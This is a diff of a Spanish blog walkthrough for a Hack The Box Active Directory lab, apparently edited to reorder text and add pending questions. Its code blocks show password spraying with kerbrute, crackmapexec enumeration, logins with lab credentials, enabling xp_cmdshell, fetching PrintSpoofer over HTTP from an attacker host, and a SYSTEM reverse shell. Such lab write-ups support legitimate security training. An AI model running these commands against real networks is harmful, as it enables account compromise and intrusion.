@@ -45,7 +45,7 @@
   <meta itemprop="description" content="En curso">
   <meta itemprop="datePublished" content="2025-07-30T00:00:00+00:00">
   <meta itemprop="dateModified" content="2025-07-30T00:00:00+00:00">
-  <meta itemprop="wordCount" content="1205">
+  <meta itemprop="wordCount" content="1233">
   <meta itemprop="keywords" content="Hackthebox,AD">
 
 
@@ -360,14 +360,13 @@ Comprobamos el nombre de la máquina con <code>ntbscan</code>:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>evil-winrm -i 172.16.7.50 -u AB920 -p weasal
 </span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/AD_enumeracion_labs_2/flag_3-4.png" alt="">
 Ahora solo nos movemos al directorio de la flag. <code>C:\flag.txt</code></p>
-<p><strong>Utilice un método común para obtener credenciales débiles de otro usuario. Envíe el nombre de usuario del usuario cuyas credenciales obtenga.</strong></p>
-<p>Vamos a enumerar los usuarios desde el <code>DC</code> y exportarlos a un archivo.</p>
+<p><strong>Utilice un método común para obtener credenciales débiles de otro usuario. Envíe el nombre de usuario del usuario cuyas credenciales obtenga.</strong>
+Vamos a enumerar los usuarios desde el <code>DC</code> y exportarlos a un archivo.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo crackmapexec smb 172.16.7.3 -u <span style="color:#e6db74">&#39;ab920&#39;</span> -p <span style="color:#e6db74">&#39;weasal&#39;</span> --users | tee  usernames.txt
 </span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/AD_enumeracion_labs_2/flag_4-1.png" alt="">
 Nos quedamos solo con los usuarios.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat usernames.txt | awk <span style="color:#e6db74">&#39;{print $5}&#39;</span> | grep <span style="color:#e6db74">&#39;INLANEFREIGHT.LOCAL&#39;</span> | awk -F<span style="color:#e6db74">&#39;\\\\&#39;</span> <span style="color:#e6db74">&#39;{print $2}&#39;</span>
-</span></span></code></pre></div><p><strong>Utilice un método común para obtener credenciales débiles de otro usuario. Envíe el nombre de usuario del usuario cuyas credenciales obtenga.</strong></p>
-<p>Hacemos rociado de contraseñas con <code>Welcome1</code> con la lista de usuarios que tenemos.</p>
+</span></span></code></pre></div><p>Hacemos rociado de contraseñas con <code>Welcome1</code> con la lista de usuarios que tenemos.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>kerbrute passwordspray -d inlanefreight.local --dc 172.16.7.3 users.txt Welcome1
 </span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/AD_enumeracion_labs_2/flag_4-2.png" alt="">
 Y vemos que para el usuario <code>BR086</code> es válida dicha contraseña.</p>
@@ -393,10 +392,10 @@ Y vemos un usuario <code>netdb</code>:<code>D@ta_bAse_adm1n!</code></p>
 Debemos recordar que anteriormente cuando escaneamos la red descubrimos que el host <code>MS01</code> era <code>172.16.7.50</code> y que el host <code>SQL01</code> era el <code>172.16.7.60</code>. Vamos a trabajar con este último.
 Nos conectamos al host por mssql dado que es un servidor con una base de datos de microsoft.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mssqlclient.py -dc-ip 172.16.7.3 INLANEFREIGHT/netdb:<span style="color:#e6db74">&#39;D@ta_bAse_adm1n!&#39;</span>@172.16.7.60
-</span></span></code></pre></div><p>Vemos que tenemos acceso sin embargo no tenemos permisos para leer la flag que se encuentra en el path de <code>Administrator</code>.</p>
-<p>Habilitamos el <code>xp_cmdshell</code> para poder ejecutar comando en el servidor a través de SQL:</p>
+</span></span></code></pre></div><p>Habilitamos el <code>xp_cmdshell</code> para poder ejecutar comando en el servidor a través de SQL:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>enable_xp_cmdshell;
-</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/AD_enumeracion_labs_2/flag_7-1.png" alt=""></p>
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/AD_enumeracion_labs_2/flag_7-1.png" alt="">
+Vemos que tenemos acceso sin embargo no tenemos permisos para leer la flag que se encuentra en el path de <code>Administrator</code>.</p>
 <p>Cuando revisamos la información de los permisos del usuario:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">exec</span> xp_cmdshell <span style="color:#e6db74">&#39;whoami/priv&#39;</span>
 </span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/AD_enumeracion_labs_2/flag_7-2.png" alt="">
@@ -419,8 +418,6 @@ Nos lo descargamos a local, luego desde local, lo copiamos al pivote</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python -m http.server
 </span></span></code></pre></div><p>Desde <code>SQL01</code> nos lo descargamos, debemos situarnos en un directorio que tengamos permisos de escritura, <code>C\Users\Public</code> por ejemplo:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Invoke-WebRequest -Uri http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">172.16</span>.7.<span style="color:#ae81ff">240</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">8000</span>/PrintSpoofer.exe -OutFile .\PrintSpoofer.exe 
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Invoke-WebRequest -Uri http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">172.16</span>.7.<span style="color:#ae81ff">240</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">8000</span>/PrintSpoofer64.exe -OutFile .\PrintSpoofer64.exe 
 </span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/AD_enumeracion_labs_2/flag_7-6.png" alt=""></p>
 <p>Posteriormente ejecutamos el archivo y preparamos una reverseshell hacia nuestro pivote donde la vamos a recibir con privilegios de <code>SYSTEM</code>. Esta vez por otro puerto.</p>
 <p><img src="../../../../../images/HTB_modulos/AD_enumeracion_labs_2/flag_7-7.png" alt="">
@@ -483,6 +480,9 @@ ConvertTo-Sid &#34;Domain Admins&#34;
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Convert-SidToName <span style="color:#e6db74">&#34;S-1-5-21-3327542485-274640656-2609762496-4611&#34;</span>
 </span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/AD_enumeracion_labs_2/flag_9-6.png" alt="">
 <code>CT059</code></p>
+<p><strong>Descifre el hash de la contraseña de este usuario y envíe la contraseña en texto sin formato como respuesta.</strong></p>
+<p><strong>Envíe el contenido del archivo flag.txt en el escritorio del administrador en el host DC01.</strong></p>
+<p><strong>Envíe el hash NTLM de la cuenta KRBTGT para el dominio de destino después de lograr el compromiso del dominio.</strong></p>
 <p>Si te sirvió de algo este tutorial ya para mi es más que suficiente, si me puedes decir en que podemos mejorar te lo voy a agradecer un montón.</p>
 
 
